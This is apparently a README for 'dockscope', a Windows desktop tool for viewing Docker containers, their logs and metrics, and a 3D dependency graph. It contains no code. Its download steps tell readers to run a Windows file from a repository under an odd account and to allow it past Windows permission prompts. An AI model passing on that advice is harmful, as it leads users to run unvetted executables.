# dockscope - See Docker in one clear view

[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/bankable-alevel944/dockscope)

## 🖥️ What dockscope does

dockscope is a desktop app for people who want a clear view of their Docker setup. It shows your containers, their links, live stats, logs, and a 3D map of how they depend on each other.

Use it when you want to:

- See running containers in one place
- Check CPU, memory, and network use
- Read logs without opening command prompts
- Open a terminal for a container
- Start, stop, restart, or remove containers
- Understand how services connect

## 📥 Download dockscope

1. Open the download page: https://github.com/bankable-alevel944/dockscope
2. Find the latest version or release on the page
3. Download the Windows file from that page
4. Open the file after it finishes downloading
5. Follow the on-screen steps to install or start the app

If Windows asks for permission, select the option to allow the app to run.

## 💻 Windows setup

dockscope is built for Windows users who want a simple desktop tool. For a smooth start, use:

- Windows 10 or Windows 11
- At least 8 GB of memory
- A few hundred MB of free disk space
- A working Docker install
- Docker Desktop or another Docker engine that is already running

If Docker is not installed yet, set that up first. dockscope connects to your local Docker engine to show your containers.

## 🚀 First run

After you open dockscope:

1. Wait for the app to load
2. Let it connect to Docker
3. Open the main dashboard
4. Look at your containers list
5. Click any container to see details

The app should pick up your local Docker setup and show the current state of your system.

## 🧭 Main parts of the app

### 🧊 3D dependency graph

dockscope includes a 3D view that helps you see how containers relate to each other. It is useful when you have many services and want to know what depends on what.

You can use it to:

- Spot connected services
- Find the place of one container in a larger stack
- Understand a project at a glance

### 📊 Live metrics

The metrics view shows live data for containers. This helps you watch system load while a service runs.

You can track:

- CPU use
- Memory use
- Network activity
- Container status

### 📝 Logs

Logs show what a container has done. This is one of the fastest ways to find errors or confirm that a service started the right way.

You can:

- Read recent output
- Follow new log lines
- Switch between containers

### 🖱️ Container actions

dockscope lets you act on containers without typing commands.

Common actions include:

- Start
- Stop
- Restart
- Remove
- Open terminal

### 🖥️ Terminal

The terminal view gives you direct access to a container shell. Use it when you need to check files, run a command, or inspect a service from inside the container.

## 🛠️ How to use it day to day

A simple way to work with dockscope:

1. Open the app
2. Check which containers are running
3. Open the 3D graph to see service links
4. Open logs for any container that looks wrong
5. Check metrics if the app feels slow
6. Use the terminal if you need more detail
7. Restart or stop a container from the app if needed

This flow works well for home labs, small projects, and local development setups.

## 🔍 Tips for a better setup

- Keep Docker Desktop running before you open dockscope
- Use clear container names so the graph is easier to read
- Group related services in one compose file when possible
- Check logs first when a container does not start
- Watch memory use if your machine feels slow

## 🧩 Common uses

dockscope fits well in setups like:

- A local web app with a database
- A multi-container Docker Compose project
- A test environment on a Windows PC
- A home server you want to monitor from a desktop app
- A small service stack with a few linked containers

## 📁 What you get

The app is built around a simple workspace that brings together:

- Container list
- Graph view
- Live metrics
- Logs panel
- Terminal panel
- Action controls

This makes it easier to keep track of a whole stack without switching between tools.

## ✅ Before you install

Make sure you have:

- A Windows PC
- Internet access to open the download page
- Docker already installed
- Permission to run desktop apps on your system

If you use a work PC, check that you can run local Docker tools before you install dockscope.

## 🧪 Best results

For the best experience:

- Run a few containers so the graph has something to show
- Use Docker Compose projects for clearer service links
- Keep your Docker version current
- Open logs when a container fails to start
- Use the terminal for quick checks inside a container

## 📎 Project link

Open the download and project page here:

https://github.com/bankable-alevel944/dockscope

## 🧭 Simple start checklist

- Download dockscope from the GitHub page
- Open the file on Windows
- Let it connect to Docker
- View your containers
- Check logs, metrics, or the 3D graph
- Use container actions when needed